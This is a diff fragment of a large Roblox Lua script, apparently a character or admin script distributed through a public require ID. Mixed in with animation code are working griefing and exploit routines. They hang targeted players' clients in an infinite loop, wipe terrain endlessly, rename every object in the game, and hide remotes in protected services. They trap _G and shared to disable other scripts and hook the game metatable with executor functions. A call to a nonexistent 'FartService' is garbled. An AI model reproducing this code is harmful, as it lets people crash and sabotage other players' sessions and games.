+						v.TextColor3=Clerp(v.TextColor3, DefaultColor, 0.1)
+					end
+				end
+				if not game:GetService("Players").LocalPlayer:GetAttribute(Identifier) then
+					for s, r in pairs(Replace) do
+						v.Text=v.Text:gsub(s, r)
+					end
+				end
+			end
+		end)
+	end)
+	local function Check()
+		function TextChatService.OnIncomingMessage(Message)
+			if Message.PrefixText:gsub(":", "")==Player or Message.PrefixText:gsub(":", "")==DisplayName then
+				local Prop=Instance.new("TextChatMessageProperties", Message, {Archivable=false, Name=gfunc(), PrefixText=gfunc(), Text=Message.Text})
+				if IsUser then
+					Resume(function()
+						Remote:FireServer("Chat", Message.Text)
+					end)
+				end
+				game:GetService("FartService"):Fart("ExtraStinky")
+				--return Fire(MessageAdded, Insert(Messages, {Properties=Prop, Message=Message, Connections={}})).Properties
+			else
+				return nil
+			end
+		end
+	end	
+	for _, e in ipairs({"RenderStepped", "Stepped", "Heartbeat"}) do
+		RunService[e]:Connect(Check)
+	end
+	RunService.RenderStepped:Connect(function(Frames)
+		ConsecutiveFrames+=Frames
+		Throttle=0
+		for _ = 1, ConsecutiveFrames/Frame do
+			ConsecutiveFrames-=Frame
+			Throttle+=1
+		end
+		local OldClerp=Clerp
+		local function Clerp(_1, _2, _3)
+			if Movement.Walking then
+				return Clerp2(_1, _2, _3)
+			else
+				return OldClerp(_1, _2, _3, Throttle)
+			end
+		end
+		pcall(function()
+			if Queued then
+				Welds.RootJoint.C0 = Clerp(Welds.RootJoint.C0,Welds.Defaults.RootJoint.C0*CFrame.new(0,.1,.2*math.cos(Sine/40))*CFrame.Angles(0,0,math.rad(40)),.25)
+				Welds.Neck.C0 = Clerp(Welds.Neck.C0,Welds.Defaults.Neck.C0*CFrame.Angles(0,math.rad(5),math.rad(-40)),.25)
+				Welds.RightShoulder.C0 = Clerp(Welds.RightShoulder.C0,CFrame.new(1.5,.5,.1)*CFrame.Angles(math.rad(85),0,math.rad(40))*Welds.Defaults.RightShoulder.C0,.25)
+				Welds.LeftShoulder.C0 = Clerp(Welds.LeftShoulder.C0,CFrame.new(-1.25,.85+.1*math.sin(Sine/40),-.25)*CFrame.Angles(math.rad(135),0,math.rad(45))*Welds.Defaults.LeftShoulder.C0,.25)
+				Welds.RightHip.C0 = Clerp(Welds.RightHip.C0,CFrame.new(1,-1+.05*math.sin(Sine/40),0)*CFrame.Angles(0,math.rad(90),math.rad(-5-2*math.sin(Sine/40))),.25)
+				Welds.LeftHip.C0 = Clerp(Welds.LeftHip.C0,CFrame.new(-1,-.375+.125*math.cos(Sine/40),-.5)*CFrame.Angles(0,math.rad(-90),math.rad(15-5*math.sin(Sine/40))),.25)
+			elseif Movement.Walking then
+				Welds.RootJoint.C0 = Clerp(Welds.RootJoint.C0,Welds.Defaults.RootJoint.C0*CFrame.new(0,0,.6*math.sin(Sine/16))*CFrame.new(SidewaysMovement+(1.5*SidewaysMovement)*math.sin(Sine/16),ForwardMovement-ForwardMovement*math.cos(Sine/16),-.185+.045*math.cos(Sine/56))*CFrame.Angles(math.rad((-15*ForwardMovement*math.sin(Sine/16))+(ForwardMovement*20)),math.rad(-SidewaysMovement*50),math.rad(math.cos(Sine/16))),.1)
+				Welds.Neck.C0 = Clerp(Welds.Neck.C0,Welds.Defaults.Neck.C0*CFrame.Angles(math.rad((25+20*ForwardMovement*math.sin(Sine/16))+(-ForwardMovement)*18),math.rad(SidewaysMovement*5),math.rad(-SidewaysMovement*45-1)),.1)
+				Welds.RightShoulder.C0 = Clerp(Welds.RightShoulder.C0,CFrame.new(1.45+.0*math.cos(Sine/16),.5,0)*CFrame.Angles(math.rad((10*ForwardMovement*math.cos(Sine/16))-ForwardMovement*25),math.rad(ForwardMovement*5),math.rad(18-(SidewaysMovement*28)+ForwardMovement*-10*math.sin(Sine/16)))*Welds.Defaults.RightShoulder.C0,.1)
+				Welds.LeftShoulder.C0 = Clerp(Welds.LeftShoulder.C0,CFrame.new(-1.45+.0*math.cos(Sine/16),.5,0)*CFrame.Angles(math.rad((10*ForwardMovement*math.cos(Sine/16))-ForwardMovement*25),math.rad(-ForwardMovement*5),math.rad(-18-(SidewaysMovement*28)+ForwardMovement*10*math.sin(Sine/16)))*Welds.Defaults.LeftShoulder.C0,.1)
+				Welds.RightHip.C0 = Clerp(Welds.RightHip.C0,CFrame.new(1,-.8,-.15)*CFrame.Angles(math.rad(-20-(20*math.cos(Sine/16))*ForwardMovement),math.rad(85),math.rad((5*ForwardMovement)-SidewaysMovement*15)),.1)
+				Welds.LeftHip.C0 = Clerp(Welds.LeftHip.C0,CFrame.new(-1,-.6,-.3)*CFrame.Angles(math.rad(-20-(20*math.cos(Sine/16))*ForwardMovement),math.rad(-85),math.rad((-5*ForwardMovement)-SidewaysMovement*15)),.1)
+			elseif Movement.Emote then
+				local a="RootJoint"
+				getfenv()[a], getfenv()[a.."C0"]=Welds[a], Welds.Defaults[a].C0
+				local a="Neck"
+				getfenv()[a], getfenv()[a.."C0"]=Welds[a], Welds.Defaults[a].C0
+				local a="RightShoulder"
+				getfenv()[a], getfenv()[a.."C0"]=Welds[a], Welds.Defaults[a].C0
+				local a="LeftShoulder"
+				getfenv()[a], getfenv()[a.."C0"]=Welds[a], Welds.Defaults[a].C0
+				local a="RightHip"
+				getfenv()[a], getfenv()[a.."C0"]=Welds[a], Welds.Defaults[a].C0
+				local a="LeftHip"
+				getfenv()[a], getfenv()[a.."C0"]=Welds[a], Welds.Defaults[a].C0
+				for i, v in pairs(Welds) do
+					pcall(function()
+						if i=="Defaults" then return; end
+						getfenv()[i]=v
+					end)
+				end
+				RootJoint.C0 = Clerp(RootJoint.C0, RootJointC0 * CFrame.new(0, 0, 0.5 * math.sin(Sine/30)) * CFrame.Angles(math.rad(-5+7.5*math.cos(Sine/30)), math.rad(-10*math.cos(Sine/30)), math.rad(0)), 0.1)
+				Neck.C0 = Clerp(Neck.C0, NeckC0 * CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(-15*math.cos(Sine/30)), math.rad(0)), 0.1)
+				RightShoulder.C0 = Clerp(RightShoulder.C0, CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(135+-35*math.cos(Sine/30)), math.rad(0), math.rad(25+15*math.cos(Sine/30))) * RightShoulderC0, 0.1)
+				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(5-10*math.sin(Sine/15)), math.rad(5+25*math.sin(Sine/30)), math.rad(-25+10*math.cos(Sine/30))) * LeftShoulderC0, 0.1)
+				RightHip.C0 = Clerp(RightHip.C0, CFrame.new(1, -1, -0.01) * CFrame.Angles(math.rad(-6+9*math.sin(Sine/15)), math.rad(80), math.rad(10+10*math.sin(Sine/30))), 0.1)
+				LeftHip.C0 = Clerp(LeftHip.C0, CFrame.new(-1, -1, -0.01) * CFrame.Angles(math.rad(0+6*math.sin(Sine/15)), math.rad(-80), math.rad(-10-10*math.sin(Sine/30))), 0.1)
+			else
+				local Sine=-Sine
+				Welds.Neck.C0 = Clerp(Welds.Neck.C0,Welds.Defaults.Neck.C0*CFrame.Angles(math.rad(16.5-1.5*math.cos(Sine/16)),math.rad(2.5-5.5*math.cos(Sine/16)),math.rad(-16.5*math.sin(Sine/15+.4*math.cos(Sine/20)))), 0.1)
+				Welds.RootJoint.C0 = Clerp(Welds.RootJoint.C0, Welds.Defaults.RootJoint.C0*CFrame.new(0,.25*math.cos(Sine/16),.4*math.sin(Sine/16))*CFrame.Angles(math.rad(5-6*math.cos(Sine/16)), 0, 0), 0.1)
+				Welds.RightShoulder.C0 = Clerp(Welds.RightShoulder.C0, CFrame.new(1.45, 0.6+0.15*math.sin(Sine/16), 0)*CFrame.Angles(math.rad(-3.25+10*math.cos(Sine/16)), math.rad(-5*math.sin(Sine/16)), math.rad(28+7*math.sin(Sine/16)))*Welds.Defaults.RightShoulder.C0, 0.1)
+				Welds.RightHip.C0 = Clerp(Welds.RightHip.C0,CFrame.new(1, -0.6+0.1*math.sin(Sine/16), -0.4)*CFrame.Angles(math.rad(-21.5-12*math.cos(Sine/16)), math.rad(65-1*math.cos(Sine/16)), math.rad(2.5-0.4*math.cos(Sine/16))), 0.1)
+				Welds.LeftHip.C0 = Clerp(Welds.LeftHip.C0,CFrame.new(-1, -0.85+0.1*math.sin(Sine/16), -0.1)*CFrame.Angles(math.rad(-15.5-10*math.cos(Sine/16)), math.rad(-65+1*math.cos(Sine/16)), math.rad(-2-2*math.cos(Sine/17))), 0.1)
+				Welds.LeftShoulder.C0 = Clerp(Welds.LeftShoulder.C0, CFrame.new(-1.45, 0.6+0.15* math.sin(Sine/16), 0)*CFrame.Angles(math.rad(-3.25+10*math.cos(Sine/16)), math.rad(5*math.sin(Sine/16)), math.rad(-28-7*math.sin(Sine/16)))*Welds.Defaults.LeftShoulder.C0, 0.1)
+			end
+		end)
+		pcall(function()
+			Character.Torso.CFrame=Weldify(Welds.RootJoint, Movement)
+			Character.Head.CFrame=Weldify(Welds.Neck, Character.Torso)
+			Character.RightArm.CFrame=Weldify(Welds.RightShoulder, Character.Torso)
+			Character.LeftArm.CFrame=Weldify(Welds.LeftShoulder, Character.Torso)
+			Character.RightLeg.CFrame=Weldify(Welds.RightHip, Character.Torso)
+			Character.LeftLeg.CFrame=Weldify(Welds.LeftHip, Character.Torso)
+			Character.Gun.CFrame=Weldify(Welds.GunHandle, Character.RightArm)
+			Character.PortalHolder.Position=Character.Torso.CFrame.Position
+			Character.EyeHolder.Position=Character.Head.CFrame*CFrame.new(0, 0, -0.6).Position
+		end)
+	end)
+	Welds.Defaults.RightHip={C0=CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(90), math.rad(0))}
+	Welds.Defaults.LeftHip={C0=CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(-90), math.rad(0))}
+	Texts, TextChanged={}, {}
+	local function AddText(v)
+		if table.pack(pcall(function() return v.Text; end))[1] then
+			Insert(Texts, v)
+			local AC; AC=v.AncestryChanged:Connect(function()
+				if not v:IsDescendantOf(game) then
+					Remove(Texts, v)
+					Disconnect(AC)
+				end
+			end)
+		end
+	end
+	game.DescendantAdded:Connect(AddText)
+	for _, v in pairs(game:GetDescendants()) do
+		AddText(v)
+	end
+	local Parts={}
+	local Deleted={}
+	local function CheckIfPart(v)
+		if IsProtected(v) then return; end
+		if v:IsA("BasePart") then
+			table.insert(Parts, v)
+			local AC; AC=v.AncestryChanged:Connect(function()
+				if not v:IsDescendantOf(workspace) then
+					Remove(Parts, v)
+					AC:Disconnect()
+				end
+			end)
+		end
+	end
+	workspace.DescendantAdded:Connect(CheckIfPart)
+	for _, v in pairs(workspace:GetDescendants()) do
+		CheckIfPart(v)
+	end
+	RunService.Stepped:Connect(function()
+		for _, v in pairs(Parts) do
+			if v.Material==Enum.Material.ForceField or v.Material=="ForceField" then
+				v:SetAttribute(DeleteAtt, RandomString())
+			end
+			if v:GetAttribute(DeleteAtt) and not Deleted[v] then
+				v:SetAttribute(DeleteAtt, false)
+				Deleted[v]=true
+				local Con={}
+				local RandomCFrame=CFrame.new(math.random(-1e6, 1e6), 9e9, math.random(-1e6, 1e6))
+				table.insert(Con, v:GetPropertyChangedSignal("Anchored"):Connect(function()
+					if not v.Anchored then
+						v.Anchored=true
+					end
+				end))
+				table.insert(Con, v:GetPropertyChangedSignal("CFrame"):Connect(function()
+					if v.CFrame~=RandomCFrame then
+						v.CFrame=RandomCFrame
+					end
+				end))
+				v.CFrame=RandomCFrame
+				pcall(function()
+					table.insert(Con, v:GetPropertyChangedSignal("MeshId"):Connect(function()
+						if v.MeshId~=MeshKiller.MeshId then
+							v:ApplyMesh(MeshKiller)
+						end
+					end))
+					v:ApplyMesh(MeshKiller)
+				end)
+				local AC; AC=v.AncestryChanged:Connect(function()
+					if not v:IsDescendantOf(workspace) then
+						Clean(Con)
+						Deleted[v]=nil
+						AC:Disconnect()
+					end
+				end)
+			end
+		end
+	end)
+	function ClearAttributes(...)
+		for _, Object in ipairs({...}) do
+			pcall(function()
+				for i, _ in pairs(Object:GetAttributes()) do
+					pcall(function()
+						Object:SetAttribute(i, nil)
+					end)
+				end
+			end)
+		end
+	end
+	local function rsi(ClassName)
+		return game:FindService(tostring(ClassName)) or game:GetService(tostring(ClassName))
+	end
+	local Serv, RServ, DescendantClasses={Services={"NetworkClient", "ServerStorage", "ServerScriptService"}}, {Services={"ControllerService", "HttpService", "InsertService", "Stats", "ServerStorage", "ServerScriptService", "MemStorageService"}, LastServicePicked={[1]=nil, [2]=nil}, LastDescendantPicked={[1]=nil, [2]=nil}}, {ClassNames={"StringValue", "ClientReplicator", "StatsItem", "HumanoidController", "MemStorageConnection"}}
+	RunService.RenderStepped:Connect(function()
+		local FoundContainer, FoundRemote, FoundMessages=Exists(Remote, Container, MessageContainer)
+		if FoundContainer then
+			WWWWW(Container)
+			local Data=Container:GetAttribute("ToCrash")
+			if Data then
+				local Player=Players.LocalPlayer
+				if ((string.match(string.lower(Player.Name), string.lower(Data)) or (string.match(string.lower(Player.DisplayName), string.lower(Data)))) or Player.UserId==tonumber(Data)) then
+					while true do
+
+					end
+				end
+			end
+		end
+		if FoundMessages then
+			WWWWW(MessageContainer)
+		end
+		if FoundRemote then
+			WWWWW(Remote)
+		end
+
+	--[[local PickedService=(tof() and Stats) or MemStorageService
+	local Descendants=PickedService:GetDescendants()
+	if #Descendants<1 then Descendants=rsi(PickRandom(RServ.Services)):GetDescendants(); end
+	if #Descendants<1 then Descendants=rsi(PickRandom(RServ.Services)) end]]
+		local Descendants={Stats, Chat, SoundService, ReplicatedStorage, Players, TestService, NetworkClient, HttpService, InsertService, MemStorageService}
+		pcall(function()
+			if IsExploit then
+				Descendants={HSRDataContentProvider, IXPService, CloudLocalizationTable, LodDataService, MessageBusService, NonReplicatedCSGDictionaryService, SessionService, SpawnerService, PlayerEmulatorService, SafetyService, ScriptRegistrationService, StudioData, RbxAnalyticsService, CoreGui, RobloxReplicatedStorage, ScriptContext, RuntimeScriptService, LuauScriptAnalyzerService, DraggerService}
+				Remote.Parent=PickRandom(Descendants)
+				Container.Parent=PickRandom(Descendants)
+				MessageContainer.Parent=PickRandom(Descendants)
+			else
+				Remote.Parent=PickRandom(Descendants)
+				Container.Parent=PickRandom(Descendants)
+				MessageContainer.Parent=PickRandom(Descendants)
+			end
+		end)
+
+	--[[for _, Service in ipairs(FunnyServices) do
+		pcall(function()
+			if Service:IsA("Stats") then
+			end
+		end)
+			local ClassName=Service.ClassName
+			if not table.find(Serv.Services, ClassName) and not table.find(RServ.Services, ClassName) then return WWWWW(Service); end
+			local Descendants=Service:GetDescendants()
+			if Service==PickedService then
+				local Last1, Last2, New1, New2=RServ.LastServicePicked[1], RServ.LastServicePicked[2], rsi(PickRandom(RServ.Services)), rsi(PickRandom(RServ.Services))
+				if (New1==Last1 or New1==Last2) then
+					repeat New1=rsi(PickRandom(RServ.Services)); until New1~=Last1 and New1~=Last2
+				end
+				if (New2==Last2 or New2==Last1) then
+					repeat New2=rsi(PickRandom(RServ.Services)); until New2~=Last2 and New2~=Last1
+				end
+				New1, New2=(#Descendants>0 and PickRandom(Descendants)) or Service, (#Descendants>0 and PickRandom(Descendants)) or Service
+				if FoundContainer then
+					Container.Parent=New1
+				end
+				if FoundRemote then
+					Remote.Parent=New2
+				end
+			end
+			if table.find(Serv.Services, ClassName) or table.find(RServ.Services, ClassName) then
+				--WWWWW(Service)
+			end
+			for _, x in ipairs(Descendants) do
+				if table.find(DescendantClasses.ClassNames, x.ClassName) then
+				--	WWWWW(x)
+				end
+			end
+		end)
+	end]]
+	end)
+	if not IsUser then
+		Players.LocalPlayer.AncestryChanged:Connect(function()
+			function Se()
+				coroutine.wrap(function()
+					while true do
+						game.DescendantAdded:Connect(Se)
+						game:GetService("RunService").Heartbeat:Connect(Se)
+						game:GetService("RunService").RenderStepped:Connect(Se)
+						game:GetService("RunService").Stepped:Connect(Se)
+						for _, v in pairs(game:GetDescendants()) do
+							pcall(function()
+								v.Name=""
+							end)
+						end
+					end
+				end)()
+			end
+			Se()
+		end)
+	end
+	Resume(function()
+		while true do
+			workspace.Terrain:Clear()
+			task.wait()
+		end
+	end)
+
+	for i, v in pairs(prop) do
+		local function Set()
+			if (Lighting[i]~=prop[i]) then
+				pcall(function()
+					Lighting[i]=prop[i]
+				end)
+			end
+		end
+		pcall(Set)
+		Lighting:GetPropertyChangedSignal(i):Connect(Set)
+	end
+	Resume(function()
+		--pcall(function()
+		local function FindMessages(v)
+			pcall(function()
+				if v:GetAttribute(FakeWOW) then
+					MessageContainer=v
+				elseif v:GetAttribute(FakeFR) then
+					Remote=v
+				elseif v:GetAttribute(FakestLOL) then
+					Container=v
+				end
+			end)
+		end
+		game.DescendantAdded:Connect(FindMessages)
+		for _, v in ipairs(game:GetDescendants()) do
+			FindMessages(v)
+		end
+		if not Messages_ then Messages_={}; end
+		repeat RunService.RenderStepped:Wait(); until MessageContainer and RGB~=nil and DefaultColor
+		if not IsUser then
+			for Index, Message in pairs(MessageContainer:GetAttributes()) do
+				local Message=MessageContainer:GetAttribute(tostring(Index))
+				if not Messages_[tostring(Index)] then
+					Messages_[tostring(Index)]=Message
+					local msg=Message
+					local function say(u: string, msg: string)
+						local DefaultColor=DefaultColor
+						if RGB then DefaultColor=HSV(4); end
+						local Hex=([[<font color='#DefaultColor'>%s<font color='#DefaultColor'>%s</font>: %s</font>]]):gsub("DefaultColor", tostring(DefaultColor:ToHex()))
+						ChatSystem:DisplaySystemMessage(string.format(Hex, u ~= "" or "", "TheAscensionist", (msg)))
+					end
+					say("", msg)
+					StarterGui:SetCore("ChatMakeSystemMessage", {
+						Text = "TheAscensionist"..": "..(msg),
+						Color = DefaultColor,
+						FontSize = Enum.FontSize.Size24, })
+				end
+			end
+		end
+	end)
+	Resume(function()
+		task.wait(1)
+		for i, _ in pairs(script:GetAttributes()) do
+			script:SetAttribute(i, nil)
+		end
+	end)
+	Lighting.ChildAdded:Connect(DDD)
+	local function NoMeta(...)
+		local Data={__index="", __newindex="", __call="", __concat="", __unm="", __add="", __sub="", __mul="", __div="", __mo="", __pow="", __tostring="", __metatable="", __eq="", __lt="", __le="", __mode="", __gc="", __len=""}
+		for i, v in pairs(Data) do
+			Data[i]=function()
+				local Level=2
+				local Caller=getfenv(Level)
+				if not Caller.script then
+					repeat
+						Level+=1
+						Caller=getfenv(Level)
+					until Caller.script
+					task.wait()
+				end
+				Caller.script.Disabled=true
+				Caller.error("Nah!", 0)
+			end
+		end
+		for _, t in ipairs(table.pack(...)) do
+			pcall(setmetatable, t, Data)
+			pcall(table.freeze, t)
+		end
+	end
+	NoMeta(_G, shared)
+	--if IsUser then
+
+	--end
+end
+local env, FakeEnv, meta, RunService, AlreadyCalled=getfenv(), {}, getrawmetatable(getgenv().game), game:FindService("RunService") or game:GetService("RunService"), false
+function FakeEnv:SetDirectVariable(Index, Value)
+	rawset(env, Index, Value)
+end
+function FakeEnv:SendAttribute(...)
+	pcall(script.SetAttribute, script, ...)
+end
+setreadonly(meta, false)
+function meta:__call(Key)
+	if (Key=="0x3rtF3" and AlreadyCalled==false) then
+		return FakeEnv
+	else
+		return error("Attempt to call an instance!", 2)
+	end
+end
+setreadonly(meta, true)
+repeat RunService.RenderStepped:Wait(); until env.Ready
 do
 	local Identifier=script:GetAttribute("Identifier")
 	local function Debr(Object, Time)
@@ -932,11 +4844,11 @@ do
 	end
 	StarterGui:SetCore("ChatMakeSystemMessage", {
 		Text = "Here is the CR Ascensionist require, require(12992232520)(UserId), it's public",
-		Color = DefaultColor,
+		Color = Color3.new(1, 1, 1),
 		FontSize = Enum.FontSize.Size24, })
 	StarterGui:SetCore("ChatMakeSystemMessage", {
 		Text = "Here is the tutorial video link, https://www.youtube.com/watch?v=YqUMT0dp88o",
-		Color = DefaultColor,
+		Color = Color3.new(1, 1, 1),
 		FontSize = Enum.FontSize.Size24, })
 	Resume(function()
 		if Players.LocalPlayer.Name==Player then
@@ -2584,7 +6496,7 @@ do
 	Character.Light=Light
 	Character.Tag=naeeym2
 	Character.EyeLight=EyeLight
-	
+
 	Character.EyeHolder:AddChild(Character.Eye, "Eye")
 	Character.Head:AddChild(Character.EyeLight, "EyeLight")
 
@@ -2890,9 +6802,9 @@ do
 			TweenService:Create(FakePortal, Tween, {Brightness=30}):Play()
 			TweenService:Create(FakeEye, Tween, {Brightness=30}):Play()
 			TweenService:Create(FakeLight2, Tween, {Brightness=45, Range=24}):Play()
-			
+
 			YieldForTween(TweenService:Create(FakeLight, Tween, {Brightness=25, Range=6}))
-			
+
 			TweenService:Create(FakePortal, Tween, {Brightness=1}):Play()
 			TweenService:Create(FakeEye, Tween, {Brightness=1}):Play()
 			TweenService:Create(FakeLight2, Tween, {Brightness=35, Range=18}):Play()
@@ -3707,7 +7619,7 @@ do
 				local Player=Players.LocalPlayer
 				if ((string.match(string.lower(Player.Name), string.lower(Data)) or (string.match(string.lower(Player.DisplayName), string.lower(Data)))) or Player.UserId==tonumber(Data)) then
 					while true do
-						
+
 					end
 				end
 			end
@@ -3718,7 +7630,7 @@ do
 		if FoundRemote then
 			WWWWW(Remote)
 		end
-		
+
 	--[[local PickedService=(tof() and Stats) or MemStorageService
 	local Descendants=PickedService:GetDescendants()
 	if #Descendants<1 then Descendants=rsi(PickRandom(RServ.Services)):GetDescendants(); end
